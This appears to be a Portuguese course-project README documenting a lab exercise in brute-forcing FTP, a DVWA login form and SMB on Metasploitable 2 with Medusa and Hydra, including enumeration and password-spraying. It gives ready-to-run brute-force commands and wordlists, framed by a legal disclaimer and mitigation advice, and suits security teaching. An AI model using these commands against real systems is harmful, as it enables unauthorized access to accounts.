# 🔐 Simulando Ataques de Brute Force com Medusa e Kali Linux

> Projeto prático desenvolvido para o desafio **"Simulando um Ataque de Brute Force de Senhas com Medusa e Kali Linux"** da formação em Cibersegurança da DIO.
>
> **Objetivo:** demonstrar, em ambiente controlado e isolado, como ataques de força bruta funcionam contra serviços FTP, formulários web (DVWA) e SMB, utilizando o Kali Linux e a ferramenta Medusa, além de propor medidas de mitigação.

⚠️ **Aviso legal/ético:** todos os testes aqui documentados foram realizados exclusivamente em máquinas virtuais de laboratório (Metasploitable 2 e DVWA), propositalmente vulneráveis, em uma rede isolada (host-only), sem acesso à internet ou a qualquer sistema de terceiros. Realizar ataques de força bruta contra sistemas sem autorização explícita é **crime** (no Brasil, Lei 12.737/2012 e Lei 14.155/2021). Use este material apenas para fins educacionais, em ambientes que você possui ou tem permissão expressa para testar.

---

## 📑 Sumário

- [Arquitetura do Laboratório](#-arquitetura-do-laboratório)
- [Preparação do Ambiente](#-preparação-do-ambiente)
- [Reconhecimento Inicial](#-reconhecimento-inicial)
- [Cenário 1 – Brute Force em FTP](#-cenário-1--brute-force-em-ftp)
- [Cenário 2 – Ataque a Formulário de Login Web (DVWA)](#-cenário-2--ataque-a-formulário-de-login-web-dvwa)
- [Cenário 3 – Enumeração SMB + Password Spraying](#-cenário-3--enumeração-smb--password-spraying)
- [Wordlists Utilizadas](#-wordlists-utilizadas)
- [Resultados Obtidos](#-resultados-obtidos)
- [Recomendações de Mitigação](#-recomendações-de-mitigação)
- [Limitações do Medusa e Lições Aprendidas](#-limitações-do-medusa-e-lições-aprendidas)
- [Estrutura do Repositório](#-estrutura-do-repositório)
- [Referências](#-referências)

---

## 🧪 Arquitetura do Laboratório

| Máquina | Função | IP (exemplo) | Rede |
|---|---|---|---|
| Kali Linux | Máquina atacante | 192.168.56.10 | Host-only (VirtualBox) |
| Metasploitable 2 | Alvo vulnerável (FTP, SMB) | 192.168.56.20 | Host-only (VirtualBox) |
| DVWA (sobre Metasploitable 2 ou VM própria) | Alvo do ataque web | 192.168.56.20 | Host-only (VirtualBox) |

A rede **host-only** garante que o tráfego de ataque fique isolado da internet e da rede física do host, evitando qualquer impacto fora do laboratório.

```
┌─────────────────┐        Rede Host-Only        ┌──────────────────────┐
│   Kali Linux     │  <------------------------>  │   Metasploitable 2   │
│  (atacante)      │      192.168.56.0/24         │  (FTP / SMB / DVWA)  │
└─────────────────┘                               └──────────────────────┘
```

---

## ⚙️ Preparação do Ambiente

1. **VirtualBox** instalado no host, com duas VMs:
   - Kali Linux (atualizado: `sudo apt update && sudo apt full-upgrade -y`)
   - Metasploitable 2 (imagem vulnerável oficial, usada apenas em laboratório)
2. Configuração de uma **rede interna / host-only adapter** em ambas as VMs, garantindo que elas se enxerguem sem exposição externa.
3. Verificação de conectividade:

```bash
ping -c 4 192.168.56.20
```

4. Instalação (caso necessário) das ferramentas utilizadas:

```bash
sudo apt install medusa nmap smbclient enum4linux hydra -y
```

---

## 🔍 Reconhecimento Inicial

Antes de qualquer ataque, foi feito um escaneamento de portas e serviços com **Nmap** para identificar os alvos:

```bash
nmap -sV -p- 192.168.56.20
```

Principais serviços identificados no Metasploitable 2:

| Porta | Serviço | Observação |
|---|---|---|
| 21 | FTP (vsftpd 2.3.4) | Versão vulnerável conhecida |
| 22 | SSH | |
| 80 | HTTP (DVWA, outros apps vulneráveis) | |
| 139/445 | SMB (Samba) | Compartilhamentos e usuários expostos |

📸 *Insira aqui o print do seu `nmap -sV -p-` → `images/nmap_scan.png`*

---

## 🎯 Cenário 1 – Brute Force em FTP

**Objetivo:** testar a robustez de credenciais do serviço FTP utilizando o Medusa.

### Comando utilizado

```bash
medusa -h 192.168.56.20 -U usuarios.txt -P senhas.txt -M ftp -t 4 -f
```

**Parâmetros:**
- `-h` → host alvo
- `-U` → arquivo de usuários
- `-P` → arquivo de senhas
- `-M ftp` → módulo do serviço (FTP)
- `-t 4` → número de threads paralelas
- `-f` → interrompe assim que encontrar a primeira combinação válida

### Resultado esperado

```
ACCOUNT FOUND: [ftp] Host: 192.168.56.20 User: msfadmin Password: msfadmin [SUCCESS]
```

### Validação do acesso

Após encontrar a credencial, o acesso foi validado manualmente:

```bash
ftp 192.168.56.20
# Usuário: msfadmin
# Senha: msfadmin
```

📸 *Insira aqui o print do ataque e do login validado → `images/medusa_ftp.png`*

---

## 🌐 Cenário 2 – Ataque a Formulário de Login Web (DVWA)

**Objetivo:** automatizar tentativas de login no formulário de autenticação do DVWA (nível de segurança "low"), simulando um ataque de força bruta web.

### Passos realizados

1. Configuração do DVWA com nível de segurança **Low** (Security Level).
2. Inspeção do formulário HTML para identificar os campos (`username`, `password`, `Login`) e o cookie de sessão (`PHPSESSID`) necessário para manter o estado da requisição.
3. Captura do parâmetro de erro de login (ex.: `"Login failed"`) usado pelo Medusa para diferenciar tentativas corretas de incorretas.

### Comando utilizado (módulo `web-form`)

```bash
medusa -h 192.168.56.20 -U usuarios.txt -P senhas.txt \
  -M web-form \
  -m FORM:"/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:F=Login failed" \
  -T 4
```

**Explicação:**
- `FORM:"/caminho:campo1=^USER^&campo2=^PASS^&..."` → define o endpoint e o mapeamento dos campos
- `F=Login failed` → string que indica falha de autenticação (critério de falha)

> 💡 Alternativa: o mesmo ataque pode ser reproduzido com **Hydra**, útil para comparação de desempenho e sintaxe:
> ```bash
> hydra -L usuarios.txt -P senhas.txt 192.168.56.20 http-post-form \
>   "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:F=Login failed"
> ```

### Validação

Login realizado manualmente via navegador com a credencial encontrada, confirmando acesso ao painel do DVWA.

📸 *Insira aqui o print do ataque e do painel do DVWA logado → `images/dvwa_login.png`*

---

## 🗂️ Cenário 3 – Enumeração SMB + Password Spraying

**Objetivo:** simular um cenário corporativo mal configurado, enumerando usuários via SMB e aplicando a técnica de **password spraying** (poucas senhas testadas contra muitos usuários, reduzindo o risco de bloqueio de conta).

### Etapa 1 – Enumeração de usuários

```bash
enum4linux -U 192.168.56.20
```

ou, de forma mais direta:

```bash
smbclient -L //192.168.56.20/ -N
```

Os usuários identificados foram salvos em `smb_usuarios.txt`.

### Etapa 2 – Criação da lista de usuários

```bash
cat smb_usuarios.txt
```
```
msfadmin
user
service
postgres
```

### Etapa 3 – Password Spraying com Medusa

Diferente do brute force tradicional (muitas senhas por usuário), o password spraying testa **poucas senhas comuns contra muitos usuários**, de forma lenta, para evitar bloqueios/alertas:

```bash
medusa -h 192.168.56.20 -U smb_usuarios.txt -P senhas_comuns.txt -M smbnt -t 1
```

### Etapa 4 – Teste de acesso com smbclient

```bash
smbclient //192.168.56.20/tmp -U msfadmin%msfadmin
```

Acesso validado manualmente listando os compartilhamentos disponíveis.

📸 *Insira aqui o print da enumeração e do password spraying → `images/smb_enum.png`*

---

## 📝 Wordlists Utilizadas

Wordlists simples e didáticas, criadas manualmente para o laboratório (ver pasta [`/wordlists`](./wordlists)):

**usuarios.txt**
```
admin
msfadmin
user
root
service
```

**senhas.txt**
```
123456
password
msfadmin
admin123
senha123
```

**senhas_comuns.txt** (para password spraying)
```
Outono2024
Empresa@123
Mudar123
Welcome1
```

> As wordlists também podem ser geradas com ferramentas como `crunch` ou `cewl`, ou obtidas de listas públicas (ex.: `rockyou.txt`, presente por padrão no Kali em `/usr/share/wordlists/`).

---

## ✅ Resultados Obtidos

| Cenário | Serviço | Credencial encontrada | Tempo aproximado |
|---|---|---|---|
| 1 | FTP | msfadmin:msfadmin | poucos segundos |
| 2 | DVWA (web-form) | admin:password | ~1 minuto |
| 3 | SMB | msfadmin:msfadmin | variável (spraying é mais lento por design) |

*(Ajuste esta tabela com os valores reais observados no seu laboratório e inclua capturas de tela na pasta `/images`.)*

---

## 🛡️ Recomendações de Mitigação

1. **Política de senhas fortes**: exigir senhas longas, complexas e não reutilizadas.
2. **Bloqueio de conta (account lockout)** após N tentativas falhas.
3. **Rate limiting / throttling** em formulários de login e serviços de autenticação.
4. **Autenticação multifator (MFA)**, reduzindo drasticamente o impacto de uma senha comprometida.
5. **Desativar serviços desnecessários** (ex.: FTP anônimo, SMBv1) e manter versões atualizadas.
6. **Monitoramento e alertas (SIEM/IDS)** para múltiplas tentativas de login falhas em curto período.
7. **CAPTCHA** em formulários web expostos publicamente.
8. **Segmentação de rede** e princípio do menor privilégio, limitando o impacto de uma credencial comprometida.
9. **Auditorias periódicas** com ferramentas como Medusa/Hydra em ambiente controlado, como parte do processo de pentest autorizado.

---

## 🧠 Limitações do Medusa e Lições Aprendidas

- O Medusa é eficiente para ataques paralelos, mas **não possui módulos tão maduros quanto o Hydra** para alguns protocolos (ex.: formulários web mais complexos com tokens CSRF dinâmicos).
- Serviços com **bloqueio de conta ou CAPTCHA** tornam o brute force tradicional inviável — por isso o **password spraying** é mais realista em ambientes corporativos.
- A **qualidade da wordlist** é mais determinante para o sucesso do ataque do que a velocidade da ferramenta.
- É fundamental sempre validar manualmente as credenciais encontradas, pois falsos positivos podem ocorrer dependendo do critério de erro configurado (`F=`).
- A documentação detalhada de cada etapa é tão importante quanto o ataque em si, especialmente em contextos profissionais (relatórios de pentest).

---

## 📁 Estrutura do Repositório

```
.
├── README.md
├── wordlists/
│   ├── usuarios.txt
│   ├── senhas.txt
│   └── senhas_comuns.txt
├── scripts/
│   └── (scripts auxiliares, se houver)
└── images/
    ├── nmap_scan.png
    ├── medusa_ftp.png
    ├── dvwa_login.png
    └── smb_enum.png
```

---

## 📚 Referências

- [Kali Linux – Site Oficial](https://www.kali.org/)
- [DVWA – Damn Vulnerable Web Application](https://github.com/digininja/DVWA)
- [Medusa – Documentação](https://github.com/jmk-foofus/medusa)
- [Nmap – Manual Oficial](https://nmap.org/book/man.html)
- [Metasploitable 2](https://github.com/rapid7/metasploitable2)

---

### 👤 Autor

Projeto desenvolvido como parte do desafio de prática da **DIO (Digital Innovation One)** — Formação em Cibersegurança.
